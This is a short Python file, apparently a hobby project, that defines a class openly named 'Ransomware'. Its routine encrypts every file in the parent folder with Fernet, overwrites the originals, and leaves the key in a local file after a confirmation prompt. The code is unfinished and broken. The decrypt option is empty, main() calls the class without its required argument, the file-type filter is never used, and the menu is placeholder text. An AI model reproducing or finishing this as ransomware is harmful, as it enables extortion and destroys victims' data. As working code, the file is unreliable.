from cryptography.fernet import Fernet
import os, sys

class Ransomware:
    def __init__(self, operation):
        if operation == 'encrypt':
            encryptedDirName = os.path.split(os.getcwd())[1]
            input(f'All the files in the same folder as "{encryptedDirName}" will be encrypted. \nPress any key to proceed...')
            
            self.FileEncryption()
        elif operation == 'decrypt':
            pass

    def KeyGen(self):
        if "decrypt_key.key" in os.listdir():
            user_imput = input("⚠️ There's already a decrypt key !\nErase the previous one ? (y/n) ")
            
            if user_imput == "n":
                sys.exit()
                
        self.key = Fernet.generate_key()
        self.fernetInstance = Fernet(self.key)

        with open(f"{os.getcwd()}/decrypt_key.key", "wb") as fileContainingKey:
            fileContainingKey.write(self.key)

    def FileEncryption(self):
        self.KeyGen()

        os.chdir("..")
        dirPath = os.getcwd()

        toEncrypt = ['.txt']
        files = []

        for file in os.listdir():
            if os.path.isfile(file):
                files.append(file)

        for file in files:
            with open(dirPath+"\\"+file, "br") as openedFile:
                fileContent = openedFile.read()
                print(fileContent)

            with open(dirPath+"\\"+file, "bw") as openedFile:
                openedFile.write(self.fernetInstance.encrypt(fileContent))
        
        print('Encryption finished')

def main():
    

    rsmwr = Ransomware()
    user_input = input("""
choix
choix
choix
"""
)

    input('press any key to continue...')

if __name__ == "__main__":
    main()